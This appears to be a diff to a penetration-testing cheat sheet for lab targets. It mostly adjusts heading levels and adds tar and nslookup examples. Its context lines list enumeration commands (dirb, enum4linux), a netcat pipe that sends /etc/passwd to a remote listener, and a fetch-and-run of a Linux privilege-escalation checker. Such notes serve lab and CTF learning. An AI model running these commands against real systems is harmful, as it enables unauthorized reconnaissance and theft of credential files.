@@ -27,13 +27,13 @@ For the following examples assume:
 ##### Enumerate directories
 `dirb http://10.37.129.11`
 
-#### Enumerate Linux (Gets OS, host, shares, potential usernames)
+##### Enumerate Linux (Gets OS, host, shares, potential usernames)
 `enum4linux -a 10.37.129.11`
 
 ##### FTP on custom port
 `ftp -p 10.37.129.11 4200`
 
-#### SSH on custom port
+##### SSH on custom port
 `ssh user@10.37.129.11 -p 22222`
 
 ##### Search for a package on the system
@@ -44,7 +44,7 @@ Local Listener: `nc -l -p 2222 > passwd`
 
 Remote Listener: `cat /etc/passwd | netcat 10.37.129.4 2222`
 
-#### Copy file over SCP
+##### Copy file over SCP
 ```bash
 $ scp -r -P 22 username@10.37.129.4:/home/whatever ~/<destination>
 $ scp safe root@10.37.129.11:~/<destination>
@@ -60,6 +60,18 @@ $ scp safe root@10.37.129.11:~/<destination>
 ```bash
 $ wget https://raw.githubusercontent.com/t04glovern/icu/master/tools/linuxprivchecker.py
 $ python linuxprivchecker.py > linux_priv_check.txt
+```
+
+##### gzip extract
+`tar -xzvf file.tar.gz`
+
+##### DNS quert using nslookup
+```bash
+## Any records
+nslookup -q=any domain.com
+
+## Just specific ones
+nslookup -q=TXT site.domain.com
 ```
 
 ##### smbclient scan
